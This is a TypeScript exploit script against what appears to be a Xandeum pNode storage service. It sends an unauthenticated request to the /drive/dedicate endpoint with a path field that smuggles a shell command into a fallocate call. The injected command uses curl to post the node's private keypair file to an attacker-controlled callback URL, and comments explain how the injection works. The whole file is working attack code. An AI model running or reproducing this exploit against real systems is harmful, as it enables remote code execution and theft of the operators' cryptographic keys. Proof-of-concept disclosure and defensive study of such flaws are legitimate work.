
import axios from 'axios';

// USER CONFIGURATION
const TARGET_IP = process.env.TARGET_IP || '127.0.0.1';
const TARGET_PORT = 4000;
const CALLBACK_URL = process.env.CALLBACK_URL || 'https://webhook.site/YOUR-UUID';

async function exploit() {
    console.log(`[+] Target: ${TARGET_IP}:${TARGET_PORT}`);
    console.log(`[+] Callback: ${CALLBACK_URL}`);
    console.log(`[+] Vulnerability: Unauthenticated RCE in /drive/dedicate`);

    if (CALLBACK_URL.includes('YOUR-UUID')) {
        console.error('[-] Error: Please set CALLBACK_URL to your listener.');
        return;
    }

    // Payload Construction
    // We break out of the "fallocate" command using split logic
    // The code does: exec(`fallocate -l ${size} ${filePath}`)
    // filePath = path.join(input_path, 'xandeum-pages')

    // Command Injection Payload:
    // We want to run: curl -X POST -d @./keypairs/pnode-keypair.json CALLBACK_URL
    const cmd = `curl -X POST -d @./keypairs/pnode-keypair.json ${CALLBACK_URL}`;

    // The injection happens in the path argument.
    // If we send path = "/tmp; COMMAND; #"
    // The shell sees: fallocate -l ... /tmp; COMMAND; #/xandeum-pages
    const payload = `/tmp; ${cmd}; #`;

    console.log(`[+] Sending Payload: ${payload}`);

    try {
        await axios.post(`http://${TARGET_IP}:${TARGET_PORT}/drive/dedicate`, {
            space: 1, // 1GB (irrelevant, just needs to be a number)
            path: payload
        }, { timeout: 5000 });

        console.log(`[+] Exploit sent! Check your listener.`);
    } catch (e: any) {
        // We expect a 500 because fallocate fails or the command chain returns non-zero
        console.log(`[+] Exploit delivered (Response: ${e.message}). This is expected.`);
    }
}

exploit();
